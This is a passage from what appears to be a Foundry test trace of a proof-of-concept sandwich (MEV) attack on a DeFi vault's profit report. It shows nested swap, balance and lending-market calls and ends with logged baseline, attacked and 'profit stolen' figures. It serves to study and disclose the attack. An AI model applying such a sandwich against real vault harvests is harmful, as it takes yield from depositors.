    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, to: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, value: 1000000000000000000000 [1e21])
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 3020324023841535647786 [3.02e21]
    │   │   │   │   │   │   └─ ← [Return] 3020324023841535647786 [3.02e21]
    │   │   │   │   │   ├─ emit Swap(param0: 0x4e1d81A3E627b9294532e990109e4c21d217376C, param1: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, param2: -837621800680 [-8.376e11], param3: 1000000000000000000000 [1e21], param4: 4252382442356877392555041285803226 [4.252e33], param5: 31750623815733582 [3.175e16], param6: 217824 [2.178e5])
    │   │   │   │   │   └─ ← [Return] 0xffffffffffffffffffffffffffffffffffffffffffffffffffffff3cf9d9a11800000000000000000000000000000000000000000000003635c9adc5dea00000
    │   │   │   │   └─ ← [Return] 837621800680 [8.376e11]
    │   │   │   ├─ [3079] 0xCE2b8e464Fc7b5E58710C24b7e5EBFB6027f29D7::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   └─ ← [Return] 30363683513771595986006474 [3.036e25]
    │   │   │   ├─ [443694] 0xCE2b8e464Fc7b5E58710C24b7e5EBFB6027f29D7::convertToAssets(30363683513771595986006474 [3.036e25]) [staticcall]
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x5ccaa3e4958c08051e26d60f7fd2454516bd981375c2ede584826490dc2e7280) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0xd0c4173c1dd1f30c5c927c8b9f98294294be1292ebd41e1eafbbcba1028343db]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000056c608e4378c0
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x5ccaa3e4958c08051e26d60f7fd2454516bd981375c2ede584826490dc2e7280) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000005db86f9f4700000000000000000000000000000000000000000000000005960f8538211fc00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000692976c70000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcd2dc555dced7422a3144a4126286675449019366f83e9717be7c2deb3daae3e) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000000913da6da4b42f538b445599b46bb4622342cf52000000000000000000000000b60f728bdce5e3921c0e42c1a6f07a1313d0040e0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x4b807718ccf367383077da1df57347d73f5163a5f2eea67b5418bf3d6c4171c7]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000007a8a74e63a88df41
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcd2dc555dced7422a3144a4126286675449019366f83e9717be7c2deb3daae3e) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000020b406711476000000000000000000000000000000000000000000000001ef6d581dc585c39c0000000000000000000000000000000000000000000000000000159e2cddc1c2000000000000000000000000000000000000000000000001471c2822431b07470000000000000000000000000000000000000000000000000000000069296a370000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x0913DA6Da4b42f538B445599b46Bb4622342Cf52, 0xB60F728BdcE5e3921C0E42c1a6F07A1313D0040e, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (35957574276214 [3.595e13], 35699286706126963612 [3.569e19], 23769101746626 [2.376e13], 23570758677370177351 [2.357e19], 1764321847 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000002818a806
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x2fb14719030835b8e0a39a1461b384ad6a9c8392550197a7c857cf9fcbd6c534) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000ee7d8bcfb72bc1880d0cf19822eb0a2e6577ab62000000000000000000000000d423d353f890ad0d18532ffaf5c47b0cb943bf470000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x6134b6f30fc70b7fbe09c812e3b24a4f48945ade04e59f00f06a48a72dfc3d2b]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000003076863c5e325992
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x2fb14719030835b8e0a39a1461b384ad6a9c8392550197a7c857cf9fcbd6c534) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000a2601820ae400000000000000000000000000000000000000000000000099c0f082365ae7c70000000000000000000000000000000000000000000000000000077dbb6ed0eb000000000000000000000000000000000000000000000000715d6173c2b5c8410000000000000000000000000000000000000000000000000000000069296aab0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xD423D353f890aD0D18532fFaf5c47B0Cb943bf47, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (11158350334692 [1.115e13], 11079119525379762119 [1.107e19], 8236596908267 [8.236e12], 8168792448935774273 [8.168e18], 1764321963 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000250d4af3
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xa0cd6b9d1fcc6baded4f7f8f93697dbe7f24f6e1fc22602a625c7a80b8e8e6ef) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000ecac9c5f704e954931349da37f60e39f515c11c1000000000000000000000000cc139318686969b9d30dd62aa206725b269da40d0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0xb5b837c74fa6806002fd3a23501b416c4fc7547bf974b0637785fa225b3fbff8]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xa0cd6b9d1fcc6baded4f7f8f93697dbe7f24f6e1fc22602a625c7a80b8e8e6ef) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000001277b17479200000000000000000000000000000000000000000000000011648dcd67ed96d7000000000000000000000000000000000000000000000000000000b4cb5f32490000000000000000000000000000000000000000000000000a9f5ac178edcf8f00000000000000000000000000000000000000000000000000000000692803500000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xecAc9C5F704e954931349Da37F60E39f515c11c1, 0xcC139318686969b9D30Dd62aA206725B269DA40d, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (1269080475538 [1.269e12], 1253282509667276503 [1.253e18], 776506126921 [7.765e11], 765430248680312719 [7.654e17], 1764229968 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000237f988a
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x0e9d558490ed0cd523681a8c51d171fd5568b04311d0906fec47d668fb55f5d9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000b0f70c0bd6fd87dbeb7c10dc692a2a610681707200000000000000000000000083f4197076614efe8e4c37bb9efbfead08d4719f0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x115a2c52309574a8b3a9fb502ff331a302403942beaee5db1149ca0fd276f620]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x0e9d558490ed0cd523681a8c51d171fd5568b04311d0906fec47d668fb55f5d9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000055f599b3f7000000000000000000000000000000000000000000000000050ea42e8860930c000000000000000000000000000000000000000000000000000000112b62c49b00000000000000000000000000000000000000000000000001025abedbf6c81d000000000000000000000000000000000000000000000000000000006926dd6e0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xB0F70C0bD6FD87dbEb7C10dC692a2a6106817072, 0x83F4197076614efe8e4c37BB9EFBfeaD08d4719f, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (369192711159 [3.691e11], 364409139627070220 [3.644e17], 73742337179 [7.374e10], 72720319772018717 [7.272e16], 1764154734 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000c98017
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcdaf57d98c2f75bffb8f0d3f7aa79bbacda4a479c47e316aab14af1ca6d85ffc) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000009a6bd7b6fd5c4f87eb66356441502fc7dcdd185b000000000000000000000000d978ce03d8bb0eb3f09cb2a469dbbc25db42f3ae0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x113b019b1a1ae6ebb77894d50fd7fd4bd87f532c42648cd3ec74849ce6a17ce6]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000476d0281656d22c4
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcdaf57d98c2f75bffb8f0d3f7aa79bbacda4a479c47e316aab14af1ca6d85ffc) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000070e1c55dad70000000000000000000000000000000000000000000000006a1a5366185e7bbd00000000000000000000000000000000000000000000000000000615debf4ca30000000000000000000000000000000000000000000000005b57300693fcbbe800000000000000000000000000000000000000000000000000000000692972050000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x9A6bd7B6Fd5C4F87eb66356441502fc7dCdd185B, 0xD978CE03d8BB0eb3f09cB2a469DbbC25DB42F3Ae, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (7757186325207 [7.757e12], 7645515015375453117 [7.645e18], 6691001158819 [6.691e12], 6581782185236020200 [6.581e18], 1764323845 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000004d8bab52
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x08f67ef41398456dbc5ff72d43c8b6f7917abfd01498a9fc6c89dabe6eb78b8c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000e007ca01894c863d7898045ed5a3b4abf0b18f37000000000000000000000000aa9853c78b92606b21ce57da7f04f301f031aba40000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x29e239c68a4f6dc6a3d25deacb5cfad26fceeee1fcd52545613bfd97aaf9896c]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000786514945491fe7c
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x08f67ef41398456dbc5ff72d43c8b6f7917abfd01498a9fc6c89dabe6eb78b8c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000acf75074ec6000000000000000000000000000000000000000000000000a3584bf474dc2175000000000000000000000000000000000000000000000000000007c82f032921000000000000000000000000000000000000000000000000756e2c6afbf3985500000000000000000000000000000000000000000000000000000000692960890000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xE007CA01894c863d7898045ed5A3B4Abf0b18f37, 0xaa9853c78B92606b21cE57Da7F04F301f031Aba4, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (11886137921222 [1.188e13], 11770241139437478261 [1.177e19], 8556363589921 [8.556e12], 8461749587880941653 [8.461e18], 1764319369 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000046d068aa
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x76e311d4b0e2e6ae88ad9bab18063452a6d39837d7104c430ff62457b91cb2cb) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000009893989433e7a383cb313953e4c2365107dc19a70000000000000000000000009b32a1859fe79fe76f8c1b771664b28852c3718c0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x345b7096db6c387717f255f209ff2e8d7c4abcac7effae88e09e9cdc4024e5c1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x76e311d4b0e2e6ae88ad9bab18063452a6d39837d7104c430ff62457b91cb2cb) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000026ffb9a5d8000000000000000000000000000000000000000000000000025312e62207118c00000000000000000000000000000000000000000000000000000002cca8b945000000000000000000000000000000000000000000000000002ab72905913a84000000000000000000000000000000000000000000000000000000006928f2a60000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x9893989433e7a383Cb313953e4c2365107dc19a7, 0x9b32a1859FE79fE76F8C1B771664b28852c3718c, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (167499113944 [1.674e11], 167498390765506956 [1.674e17], 12023544133 [1.202e10], 12023335836793476 [1.202e16], 1764291238 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000095e825
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x3a22063bd258f3f75e3135cac4ec53435dfa5b47b3d5173bb8fd5278e6c1b305) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000aa0362ecc584b985056e47812931270b99c91f9d00000000000000000000000029bdd31828260de15f6431410da3a24c1851d80e0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x4ac2d4b58754e8a4005e379d3df2c3373511409c90c276cc5ab0ec77dc392044]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000c89c02a2f58fa5b
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x3a22063bd258f3f75e3135cac4ec53435dfa5b47b3d5173bb8fd5278e6c1b305) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000d3cc875d650000000000000000000000000000000000000000000000000c89c1307e0c2564000000000000000000000000000000000000000000000000000000be9e79d9980000000000000000000000000000000000000000000000000b45e4412f7bd5d7000000000000000000000000000000000000000000000000000000006925fb000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xAa0362eCC584B985056E47812931270b99C91f9d, 0x29Bdd31828260DE15f6431410da3a24c1851d80e, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (909669522789 [9.096e11], 903465614281811300 [9.034e17], 818702571928 [8.187e11], 812306276430894551 [8.123e17], 1764096768 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003cc9c1c4
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcfac40b9f06194a33d9526f73642f6849b908c2b6d8669ad9d2d4a3e7dcb017a) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd3600000000000000000000000093fec6639717b6215a48e5a72a162c50dcc40d680000000000000000000000002c6204aedcc71a4eb373820248f513a4e91be62f0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x47fb97f2ba64cf8699ba25ede739a84eaa55353414173aa6ee718cee7797a3b2]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000002d53abb28286256b
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcfac40b9f06194a33d9526f73642f6849b908c2b6d8669ad9d2d4a3e7dcb017a) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000002fc999e29b60000000000000000000000000000000000000000000000002d53ac26ecd8ad6b000000000000000000000000000000000000000000000000000002ad7095e979000000000000000000000000000000000000000000000000289b4b87ecff124200000000000000000000000000000000000000000000000000000000692960330000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x93Fec6639717b6215A48E5a72a162C50DCC40d68, 0x2c6204aEDCC71A4EB373820248F513A4e91be62F, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (3283932293558 [3.283e12], 3266143437956099435 [3.266e18], 2943941470585 [2.943e12], 2926015430076076610 [2.926e18], 1764319283 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000004650130b
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xd3b3c992070b5a6271b11acde46cdad575e4187e499782e084d73e523153f1ed) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000007fb4d0f51544f24f385a421db6e7d4fc71ad8e5c0000000000000000000000001c5f3862c913e015ed0a2a9d71e13be74101f47d0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x8f8a620965b5e63c41a83de86019fb16d5a0ff0ebc3ec00e35c582be79d5b515]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xd3b3c992070b5a6271b11acde46cdad575e4187e499782e084d73e523153f1ed) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000022e08dabb5000000000000000000000000000000000000000000000000016cbe8086f824b300000000000000000000000000000000000000000000000000000000dfa74b370000000000000000000000000000000000000000000000000008d435b457b0f9000000000000000000000000000000000000000000000000000000006928fa110000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x7Fb4D0f51544F24F385a421Db6e7D4fC71Ad8e5C, 0x1c5f3862c913E015eD0a2A9d71E13BE74101F47d, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (149796268981 [1.497e11], 102666350752179379 [1.026e17], 3752282935 [3.752e9], 2485126937686265 [2.485e15], 1764293137 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000015235f9e
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xe4c5c5b802accd32c67253005b6e9df4f5c57c2426a9322c5e12f84981adf8c9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000005bff88ca1442c2496f7e475e9e7786383bc070c000000000000000000000000091a3030277b20c084aa83d4f8c8a714fd4e054ab0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000cb2bba6f17b8000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x91666dfc9cfeb8df5519318bc5b3d4d398a890ba98863cda55dd0c556a182672]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xe4c5c5b802accd32c67253005b6e9df4f5c57c2426a9322c5e12f84981adf8c9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000007a32e000000000000000000000000000000000000000000000000000000746a528800000000000000000000000000000000000000000000000000000000000006dfe400000000000000000000000000000000000000000000000000000068c617140000000000000000000000000000000000000000000000000000000000690a5adb0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x5Bff88cA1442c2496f7E475E9e7786383Bc070c0, 0x91A3030277B20C084Aa83d4f8C8a714Fd4E054AB, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 915000000000000000 [9.15e17]), (500526 [5.005e5], 500000000000 [5e11], 450532 [4.505e5], 450000000000 [4.5e11], 1762286299 [1.762e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000466d04f2
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000001bceed7d669b
    │   │   │   ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 837621800680 [8.376e11]
    │   │   │   │   └─ ← [Return] 837621800680 [8.376e11]
    │   │   │   ├─ [908] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   │   │   │   ├─ [507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 30573573712348 [3.057e13]
    │   │   │   │   └─ ← [Return] 30573573712348 [3.057e13]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000001c91f3a3c583
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, value: 831981731211 [8.319e11])
    │   │   ├─ emit Reported(: 839609719719 [8.396e11], : 0, : 0, : 0)
    │   │   └─ ← [Return] 839609719719 [8.396e11], 0
    │   └─ ← [Return] 839609719719 [8.396e11], 0
    ├─ [908] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   ├─ [507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   └─ ← [Return] 31413183432067 [3.141e13]
    │   └─ ← [Return] 31413183432067 [3.141e13]
    ├─ emit log_named_uint(key: "baseline profit (no MEV)", val: 1917388100357 [1.917e12])
    ├─ emit log_named_uint(key: "attacked profit (with sandwich)", val: 839609719719 [8.396e11])
    ├─ emit log_named_uint(key: "profit stolen (difference)", val: 1077778380638 [1.077e12])
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 535.36s (525.72s CPU time)

Ran 1 test suite in 535.38s (535.36s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

